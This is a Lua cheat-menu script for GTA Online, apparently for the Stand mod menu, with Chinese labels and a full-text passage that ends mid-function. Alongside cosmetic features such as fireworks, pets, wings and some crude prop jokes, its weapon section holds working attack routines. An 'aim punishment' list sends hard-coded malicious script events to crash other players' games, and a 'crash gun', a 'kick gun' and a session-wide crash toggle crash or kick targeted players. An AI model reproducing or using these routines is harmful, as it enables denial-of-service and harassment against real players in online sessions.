require("heezylib.heezylib")
require("heezylib.rid")
local aalib = require("aalib")
local PlaySound = aalib.play_sound
local SND_ASYNC<const> = 0x0001
local SND_FILENAME<const> = 0x00020000
local logo = directx.create_texture(filesystem.scripts_dir() .. '/HeezyScript/' .. 'BART.png')

--聊天翻译
focusref = {}
isfocused = false
selectedcolormenu = 0
colorselec = 1
allchatlabel = util.get_label_text("MP_CHAT_ALL")
teamchatlabel = util.get_label_text("MP_CHAT_TEAM")

util.ensure_package_is_installed("lua/heezylib/ScaleformLib")
local sfchat = require("lib.heezylib.ScaleformLib")("multiplayer_chat")
sfchat:draw_fullscreen()
--车速表
local resources_dir = filesystem.scripts_dir() .. '\\HeezyScript\\'.. '\\icluster\\'
needle = directx.create_texture(resources_dir .. 'needle.png')
speedometer_case = directx.create_texture(resources_dir .. 'speedometer_case.png')
check_engine_light = directx.create_texture(resources_dir .. 'check_engine.png')
tach_case = directx.create_texture(resources_dir .. 'tach_case.png')
high_beam = directx.create_texture(resources_dir .. 'highbeam.png')
low_beam = directx.create_texture(resources_dir .. 'lowbeam.png')
tpms = directx.create_texture(resources_dir .. 'tpms.png')
traction_control = directx.create_texture(resources_dir .. 'traction.png')
--
notification("My Bro")

util.on_stop(function()

	util.toast("lua不见啦")

end)

util.keep_running()


local menus = {}
local function player_list(pid)
    menus[pid] = menu.action(players_list, players.get_name_with_tags(pid), {}, "", function() -- thanks to dangerman and aaron for showing me how to delete players properly
        menu.trigger_commands("heezy " .. players.get_name(pid))
    end)
end

local function handle_player_list(pid)
    local ref = menus[pid]
    if not players.exists(pid) then
        if ref then
            menu.delete(ref)
            menus[pid] = nil
        end
    end
end

players.on_join(player_list)
players.on_leave(handle_player_list)

local function gen_fren_funcs(name)

	local balls = menu.list(frend_list,name, {"friend "..name}, "", function(); end)

	menu.divider(balls ,name)

	menu.action(balls,"加入战局", {"jf "..name}, "",function()

		menu.trigger_commands("join "..name)

	end)

	menu.action(balls,"观看玩家", {"sf "..name}, "",function()

		menu.trigger_commands("namespectate "..name)

	end)

	menu.action(balls,"邀请到战局", {"if "..name}, "",function()

		menu.trigger_commands("invite "..name)

	end)

	menu.action(balls,"打开玩家档案", {"pf "..name}, "",function()

		menu.trigger_commands("nameprofile "..name)

	end)

end



menu.divider(frend_list, "好友:)")

for i = 0 , get_friend_count() do

	local name = get_frined_name(i)

	if name == "*****" then goto yes end

	gen_fren_funcs(name)

	::yes::

end


    local play_fireworks = menu.list(self_options, "放烟花", {}, "")

    menu.toggle(self_options, "举手(按x)",{""}, "",function(state)

        handsup = state

        while handsup do

            hhandup()

            util.yield()

        end

    end)


    menu.toggle(self_options, "忍者跑",{""}, "",function(on)

        local renzhe = "missfbi1"

        local pao = "ledge_loop"

                while not STREAMING.HAS_ANIM_DICT_LOADED(renzhe) do 

                    STREAMING.REQUEST_ANIM_DICT(renzhe)

                    util.yield()

                end

                if on then

                    menu.trigger_commands("walkspeed 3.1")

                    menu.trigger_commands("superrun 0.75")

                    menu.trigger_commands("grace on")

                    TASK.TASK_PLAY_ANIM(players.user_ped(), renzhe, pao, 3, 3, -1, 51, 0, false, false, false)

                    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)

                else

                    menu.trigger_commands("walkspeed 1")

                    menu.trigger_commands("superrun 0")

                    menu.trigger_commands("grace off")

                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())

                    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)

                end

            end)


menu.toggle(self_options, "雪人先生",{""}, "",function(on)
    local zhangzi = "prop_gumball_03"
    local sonwman = "prop_prlg_snowpile"
    if on then
        attach_to_player(sonwman, 0, 0.0, 0, 0, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -0.5, 0, 0,0)--v_ilev_exball_grey
        attach_to_player(sonwman, 0, 0.0, 0, -1, 0, 0,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 125,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -125,0)
    else
        delete_object(sonwman)
        delete_object(zhangzi)
    end
end)




menu.toggle(self_options,"火人" ,{"burningman"}, "", function(on)
    if not on then 
        for _, p in pairs(looped_ptfxs) do
            GRAPHICS.REMOVE_PARTICLE_FX(p, false)
            GRAPHICS.STOP_PARTICLE_FX_LOOPED(p, false)
        end
    else
    fireman()
    end
end)


menu.toggle_loop(self_options, "发光", {"FG"}, "", function()
FG()
end)




menu.toggle(self_options, "金色翅膀", {"wring"}, "如果不起作用,那么就是bug", function(on_toggle)
	if on_toggle then	
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
	local wings = OBJECT.CREATE_OBJECT(util.joaat("vw_prop_art_wings_01a"), pos.x, pos.y, pos.z, true, true, true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("vw_prop_art_wings_01a"))
	ENTITY.ATTACH_ENTITY_TO_ENTITY(wings, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0x5c01), -1.0, 0.0, 0.0, 0.0, 90.0, 0.0, false, true, false, true, 0, true)
else
	local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
		end
    end)

local placed_firework_boxes = {}

menu.action(play_fireworks,"安放烟花",{},"",function()	

    local animlib = 'anim@mp_fireworks'

    local ptfx_asset = "scr_indep_fireworks"

    local anim_name = 'place_firework_3_box'

    local effect_name = "scr_indep_firework_trailburst"

    request_anim_dict(animlib)

    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 0.52, 0.0)

    local ped = players.user_ped()

    ENTITY.FREEZE_ENTITY_POSITION(ped, true)

    TASK.TASK_PLAY_ANIM(ped, animlib, anim_name, -1, -8.0, 3000, 0, 0, false, false, false)

    util.yield(1500)

    local firework_box = entities.create_object(util.joaat('ind_prop_firework_03'), pos, true, false, false)

    local firework_box_pos = ENTITY.GET_ENTITY_COORDS(firework_box)

    OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(firework_box)

    ENTITY.FREEZE_ENTITY_POSITION(ped, false)

    util.yield(1000)

    ENTITY.FREEZE_ENTITY_POSITION(firework_box, true)

    placed_firework_boxes[#placed_firework_boxes + 1] = firework_box

end)



menu.action(play_fireworks,"烟花发射",{},"",function(f)	

    if #placed_firework_boxes == 0 then 

        notification("请先安放烟花!")

        return 

    end

    local ptfx_asset = "scr_indep_fireworks"

    local effect_name = "scr_indep_firework_trailburst"

    request_ptfx_asset(ptfx_asset)

    notification("嘭")

    for i=1, 50 do

        for k,box in pairs(placed_firework_boxes) do 

            GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)

            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, box, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 0.0, 0.0, 0.0)

            util.yield(100)

        end

    end

    for k,box in pairs(placed_firework_boxes) do 

        entities.delete_by_handle(box)

        placed_firework_boxes[box] = nil

    end

end)



menu.action(self_options, "拉屎", {}, "", function()

lababa()

end)

    

menu.action(self_options, "打飞机", {}, "我还需要解释这个吗", function()

dafeiji()

end)

local obj_pp = {"prop_cs_dildo_01", "prop_ld_bomb_01", "prop_sam_01"}

local opt_pp = {"小鸡巴", "大鸡巴", "超级鸡巴", "删除"}

menu.slider_text(self_options, "获取坤巴", {}, "请选择你的坤巴", opt_pp, function(dick)
            if dick == 1 then
            attach_to_player("prop_cs_dildo_01", 57597, -0.1, 0.15, 0, 0, 90, 90)
            end

            if dick == 2 then
            attach_to_player("prop_ld_bomb_01", 57597, -0.1, 0.6, 0, 0, 180, 180)
            end

            if dick == 3 then
            attach_to_player("prop_sam_01", 57597, -0.1, 1.7, 0, 0, 180, 180)
            end

            if dick == 4 then
            for k, model in pairs(obj_pp) do 
                delete_object(model)
            end
        end
    end)

local JS_tbls = {}

JS_tbls.alphaPoints = {0, 87, 159, 207, 255}

menu.slider(self_options, '幽灵', {'ghost'}, '修改您人物的不透明度.', 0, 100, 100, 25, function(value)

    ENTITY.SET_ENTITY_ALPHA(players.user_ped(), JS_tbls.alphaPoints[value / 25 + 1], false)

end)

local mzcf = menu.list(weapon_options, "瞄准惩罚", {}, "", function(); end)

menu.toggle_loop(mzcf, '发送脚本事件崩溃', {''}, '如果他瞄准你自动崩溃', function()

    local userPed = players.user_ped()

    if playerIsTargetingEntity(userPed) and karma[userPed] then

        local karmaPid = karma[userPed].pid

util.trigger_script_event(1 << karmaPid, { -555356783, karmaPid ,85952,99999,52682274855,526822745 })

util.trigger_script_event(1 << karmaPid, { 526822748, karmaPid ,78552,99999 ,7949161,789454312})

util.trigger_script_event(1 << karmaPid, { -66669983, karmaPid ,526822748,555555, math.random(80521,2959749521) })

util.trigger_script_event(1 << karmaPid, { -1733737974, karmaPid ,789522 ,59486,48512151,-9545440,5845131,848153,math.random(1,2959749),189958})

util.trigger_script_event(1 << karmaPid, { -1529596656, karmaPid ,795221,59486,48512151,-9545440 , math.random(1,2959749) })

util.trigger_script_event(1 << karmaPid, { -8965204809, karmaPid ,795221,59486,48512151,-9545440 })

    end

end)



menu.toggle_loop(mzcf, '套笼子', {''}, '打你自动套笼', function()

    local userPed = players.user_ped()

    if playerIsTargetingEntity(userPed) and karma[userPed] then

        crashPlayer(karma[userPed].ped, true, expSettings)

    end

end)



menu.toggle_loop(mzcf, '拉海滩', {''}, '自动拉海滩', function()

    local userPed = players.user_ped()

    if playerIsTargetingEntity(userPed) and karma[userPed] then

        local karmaPid = karma[userPed].pid

        util.trigger_script_event(1 << karmaPid, {1214823473 ,1, 0, 0, 4,0,karmaPid, karmaPid})

    end

end)



  menu.toggle_loop(mzcf, '无差别崩', {''}, '如果有sb打你,无差别崩溃全局', function()

        local userPed = players.user_ped()

        if playerIsTargetingEntity(userPed) and karma[userPed] then

            heezyPlayer(karma[userPed].ped, true, expSettings)

        end

    end)


menu.toggle_loop(weapon_options, "随机射出PED", {""}, "", function()

	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())

	local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)

	if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then 

		pedspawn = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z)

		ENTITY.SET_ENTITY_ROTATION(pedspawn, rot.x, rot.y, rot.z, 1, false)

		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(pedspawn, 1, 0, 1000, 0, false, true, true, true)

	end

end)

function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = toDirection(CAM.GET_GAMEPLAY_CAM_ROT(0))
    local destination =
    {
        x = cam_pos.x + direction.x * distance,
        y = cam_pos.y + direction.y * distance,
        z = cam_pos.z + direction.z * distance
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x,
            cam_pos.y,
            cam_pos.z,
            destination.x,
            destination.y,
            destination.z,
            flag,
            -1,
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end

function direction()
    local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5, 0)
    local res = raycast_gameplay_cam(-1, 1000)
    local c2

    if res[1] != 0 then
        c2 = res[2]
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end

    c2.x = (c2.x - c1.x) * 1000
    c2.y = (c2.y - c1.y) * 1000
    c2.z = (c2.z - c1.z) * 1000
    return c2, c1
end

local remove_projectiles = false
local function disableProjectileLoop(projectile)
    util.create_thread(function()
        util.create_tick_handler(function()
            WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
            return remove_projectiles
        end)
    end)
end

local nuke_gun_toggle = menu.toggle(weapon_options, "核弹枪", {'nukeGun'}, "使用RPG发射核弹", function(toggle)
    nuke_running = toggle
    if nuke_running then
        if animals_running then menu.trigger_command(exp_animal_toggle, 'off') end
        util.create_tick_handler(function()
            if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1312131151 then --if holding homing launcher
                if PED.IS_PED_SHOOTING(players.user_ped()) then
                    if not remove_projectiles then
                        remove_projectiles = true
                        disableProjectileLoop(-1312131151)
                    end
                    util.create_thread(function()
                        local hash = util.joaat('w_arena_airmissile_01a')
                        STREAMING.REQUEST_MODEL(hash)
                        local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                        local dir, pos = direction()
                        local bomb = entities.create_object(hash, pos)
                        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                        ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do util.yield() end
                        local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                        entities.delete(bomb)
                        executeNuke(nukePos)
                    end)
                else
                    remove_projectiles = false
                end
            else
                remove_projectiles = false
            end
            return nuke_running
        end)
    end
end)

menu.toggle_loop(weapon_options, "一拳超人", {"OnePunchMan"}, "", function()

    yqcr()
    
    end)
    

weaponback = off

menu.toggle(weapon_options, "背藏武器", {}, "", function(on)

    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())

	weaponback = on

	if weaponback then

		spawnweapon = 0

	end

	curweap = HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())

	if not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == -1569615261) and weaponback then

		spawnweapon = WEAPON.CREATE_WEAPON_OBJECT(curweap, 1, pos.x, pos.y, pos.z, true, 1, 0)

		attachweapon(spawnweapon)

	end

	while weaponback do

		if (WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(plyped()) == 0) then

			if not (spawnweapon == 0) then

				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, true, false)

			end

		else

			ENTITY.SET_ENTITY_VISIBLE(spawnweapon, false, false)

		end

		if not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == curweap) and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == -1569615261) then

			if not (spawnweapon == 0) then

				entities.delete_by_handle(spawnweapon)

			end

			curweap = HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())

			requestweapon(curweap)

			spawnweapon = WEAPON.CREATE_WEAPON_OBJECT(curweap, 1, pos.x, pos.y, pos.z, true, 1, 0)

			if (WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(plyped()) == 0) then

				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, true, false)

			else

				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, false, false)

			end

			attachweapon(spawnweapon)

		end

		util.yield()

	end

	entities.delete_by_handle(spawnweapon)

end)

menu.toggle_loop(weapon_options, "神指", {"godfinger"}, "按B使用", function()
    godfinger()
end)

menu.toggle(weapon_options, "太刀",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_cs_katana_01"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.07, 0, 0, -100, 0.0, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0

			for k,ent in pairs(entities.get_all_objects_as_handles()) do

				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)

				entities.delete_by_handle(ent)

				count = count + 1

				util.yield()

			end
    end

end)

local bigbarrelqq = false
        menu.toggle(weapon_options, "大锤", {"bighammer"}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_02a"), pos.x, pos.y, pos.z, true, true, false)--prop_gate_farm_post
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_02a"), pos.x, pos.y, pos.z, true, true, false)--h4_prop_h4_barrel_01a
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbarrelqq = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbarrelqq = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)

        local hash <const> = util.joaat("VEHICLE_WEAPON_PLAYER_LAZER")
        local showNotification = true
        local lastShot = newTimer()
        local sound = Sound.new("Fire_Loop", "DLC_IE_VV_Gun_Player_Sounds")


        local DisableControlActions = function()
            PAD.DISABLE_CONTROL_ACTION(0, 106, true)
            PAD.DISABLE_CONTROL_ACTION(0, 122, true)
            PAD.DISABLE_CONTROL_ACTION(0, 135, true)
            PAD.DISABLE_CONTROL_ACTION(0, 140, true)
            PAD.DISABLE_CONTROL_ACTION(0, 141, true)
            PAD.DISABLE_CONTROL_ACTION(0, 142, true)
            PAD.DISABLE_CONTROL_ACTION(0, 263, true)
            PAD.DISABLE_CONTROL_ACTION(0, 264, true)
        end

        menu.toggle_loop(weapon_options, "镭射眼", {"combustionman"}, "", function()
        
            HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
            DisableControlActions()
            if not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) then
                WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 26)
            end
        
            if not PAD.IS_DISABLED_CONTROL_PRESSED(51, 51) then
                if not sound:hasFinished() then
                    sound:stop()
                end
            elseif lastShot.elapsed() > 100 then
                local pos = PED.GET_PED_BONE_COORDS(players.user_ped(), 0x322C, 0.0, 0.0, 0.0)
                local offset = get_offset_from_cam(80)
                if  sound:hasFinished() then
                    sound:playFromEntity(players.user_ped())
                    AUDIO.SET_VARIABLE_ON_SOUND(sound.Id, "fireRate", 10.0)
                end
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                    pos.x, pos.y, pos.z,
                    offset.x, offset.y, offset.z,
                    200,
                    true,
                    hash, players.user_ped(), true, true, -1.0
                )
                lastShot.reset()
            end
        end, function()
            if not sound:hasFinished() then
                sound:stop()
            end
        end)

        menu.toggle_loop(weapon_options, "激光眼", {"lasereyes"}, "", function(on)
            laser_eyes()
        end)

        menu.toggle_loop(weapon_options, "踢出枪", {"kickgun"}, "", function()
            local ent = get_aim_info()['ent']
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if ENTITY.IS_ENTITY_A_PED(ent) then
                    if PED.IS_PED_A_PLAYER(ent) then
                        local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ent)
                        if players.get_host() == pid then 
                            notification("您正试图踢出的玩家是主机")
                            return
                        end
                        menu.trigger_commands("kick" .. players.get_name(pid))
                    end
                end
            end
        end)

        menu.toggle_loop(weapon_options, "崩溃枪", {"crashgun"}, "", function()
            local ent = get_aim_info()['ent']
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if ENTITY.IS_ENTITY_A_PED(ent) then
                    if PED.IS_PED_A_PLAYER(ent) then
                        local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ent)
                        menu.trigger_commands("crash" .. players.get_name(pid))
                    end
                end
            end
        end)

local myroot = menu.list(interesting_options, "宠物选项", {}, "", function(); end)
local allpetsroot = menu.list(myroot, "所有宠物", {}, "")
local activepet = menu.list(myroot, "管理宠物", {}, "这些是你生成的宠物")

        menu.toggle(allpetsroot, "无敌", {}, "给你所有宠物无敌", function(on)
            if on then
                for k,v in pairs(activedogs) do
                    ENTITY.SET_ENTITY_INVINCIBLE(v, true)
                end
            else
                for k,v in pairs(activedogs) do
                    ENTITY.SET_ENTITY_INVINCIBLE(v, false)
                end
            end
        end)

        menu.action(allpetsroot, "删除所有宠物", {}, "", function()
            for k,v in pairs(activedogs) do
                entities.delete_by_handle(v)
            end
        end)
       
menu.action_slider(myroot, "生成一只宠物", {}, "生成一个忠诚的同伴,它将跟随并保护你.", dogs, function(opt, breeds)
    local hash = util.joaat("A_C_" .. breeds)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, math.random(1,4), 0)
    if getgroupsize(mygroup) >= 7 then
        notification("你已超过宠物的最大数量.")
    else
        local dog_ped = entities.create_ped(26, hash, coords, 0)
        activedogs[#activedogs+1] = dog_ped
        PED.SET_PED_AS_GROUP_MEMBER(dog_ped, mygroup)
        PED.SET_PED_AS_GROUP_MEMBER(dog_ped, mygroup)
        PED.SET_PED_NEVER_LEAVES_GROUP(dog_ped, true)
        PED.SET_GROUP_SEPARATION_RANGE(mygroup, 99999)

        local thispet = menu.list(activepet, breeds, {}, "")



        menu.text_input(thispet, "设置名字", {"setname"}, "", function(name)
            GenerateNametagOnPed(dog_ped, name)
        end)

        menu.toggle(thispet, "无敌", {}, "", function(on)
            if on then
                ENTITY.SET_ENTITY_INVINCIBLE(dog_ped, true)
            else
                ENTITY.SET_ENTITY_INVINCIBLE(dog_ped, false)
            end
        end)



        if breeds ~= "Cat_01" then

            menu.toggle(thispet, "坐下", {}, "让您的宠物坐下.", function(on)
                if on then
                    if breeds == "Rottweiler" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[1], 0, true)
                    elseif breeds == "Retriever" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[2], 0, true)
                    elseif breeds == "Shepherd" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[3], 0, true)
                    elseif breeds == "Husky" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[3], 0, true)
                    else
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[4], 0, true)

                    end
                else
                    TASK.CLEAR_PED_TASKS(dog_ped)
                end
            end)



            menu.action(thispet, "汪汪", {}, "汪汪汪!", function()
                if breeds == "Rottweiler" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_ROTWEILER", 0, true)
                elseif breeds == "Retriever" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_RETRIEVER", 0, true)
                elseif breeds == "Shepherd" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SHEPHERD", 0, true)
                elseif breeds == "Husky" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SHEPHERD", 0, true)
                else
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SMALL", 0, true)
                end
                util.yield(5000)
                TASK.CLEAR_PED_TASKS(dog_ped)
            end)
        end



        if breeds == "Cat_01" then 
            menu.toggle(thispet, "躺下放松", {}, "", function(on)
                if on then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_CAT_SLEEPING_GROUND", 0, true)
                else
                    TASK.CLEAR_PED_TASKS(dog_ped)
                end
            end)
        end


        menu.action(thispet, "删除宠物", {}, "和平中撕扯, 我毛茸茸的朋友", function()
            entities.delete_by_handle(dog_ped)
            menu.delete(thispet)
        end)
    end
end)

local damage_numbers_list = menu.list(interesting_options, "伤害数字")
local homerdq = menu.list(interesting_options, "Homer", {}, "", function(); end)


menu.toggle_loop(damage_numbers_list, "伤害数字", {"damagenumbers"}, "", function()
    damage_numbers()
end)
menu.toggle(damage_numbers_list, "包括车辆", {"damagenumbersvehicles"}, "", function (value)
    damage_numbers_target_vehicles = value
end)
menu.slider(damage_numbers_list, "数字尺寸", {"damagenumberstextsize"}, "", 1, 100, 7, 1, function (value)
    damage_numbers_text_size = value * 0.1
end)
local damage_numbers_colours_list = menu.list(damage_numbers_list, "颜色设置")
menu.rainbow(menu.colour(damage_numbers_colours_list, "默认颜色", {"damagenumcolour"}, "默认命中的颜色", damage_numbers_health_colour, true, function (value)
    damage_numbers_health_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "暴击颜色", {"damagenumcritcolour"}, "暴击颜色", damage_numbers_crit_colour, true, function (value)
    damage_numbers_crit_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "盔甲颜色", {"damagenumarmourcolour"}, "盔甲颜色", damage_numbers_armour_colour, true, function (value)
    damage_numbers_armour_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "载具颜色", {"damagenumvehiclecolour"}, "载具颜色", damage_numbers_vehicle_colour, true, function (value)
    damage_numbers_vehicle_colour = value
end))

watch_dog = menu.list(interesting_options, "看门狗PLUS", {}, "", function(); end)
watchdog_plus = menu.action(watch_dog, "加载看门狗PLUS", {""}, "看门狗PLUS", function()

    notification("正在加载看门狗PLUS,请稍等")
    menu.delete(watchdog_plus)
util.yield(3000)

dofile(filesystem.scripts_dir().."\\lib\\heezylib\\WatchDogsPlus.lua")

end)

homer = false

kill_aura_friends = false

    menu.toggle(homerdq, "Homer速度", {"homerspeed"}, "", function(on)

        if on then

        homer = on

        menu.trigger_commands("walkspeed 1.5")

        menu.trigger_commands("gracefullanding on")

        menu.trigger_commands("superrun 1.2")

        else

            menu.trigger_commands("walkspeed 1")

            menu.trigger_commands("gracefullanding off")

            menu.trigger_commands("superrun 0")

            homer = off

        end

    end,false)



    superjump = false

    menu.toggle(homerdq, "Homer跳跃", {"homerjump"}, "", function(on)

        superjump = on

    end,false)

    kill_aura = false    



    menu.toggle(homerdq, "Homer能量光环",{"homeraura"},"按e使用Homer能量光环", function(on)



        kill_aura = on



        mod_uses("ped", if on then 1 else -1)



    end)     

    kill_aura_dist = 20



    menu.slider(homerdq, "Homer能量光环范围", {"homerauraradius"}, "", 1, 100, 20, 1, function(s)



        kill_aura_dist = s



    end)



    local timer  = newTimer()

    local colour = {r = 1.0, g = 0.0, b = 1.0, a = 1.0}

    local trailsOpt  = menu.list(interesting_options,"轨迹"), {}, ""

    menu.toggle_loop(trailsOpt,"轨迹", {"trails"}, "", function ()

        if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then

            STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)

            return

        end

        if timer.elapsed() >= 1000 then

            removeFxs(effects); effects = {}

            timer.reset()

        end

        if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then

            local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

            local minimum, maximum = v3.new(), v3.new()

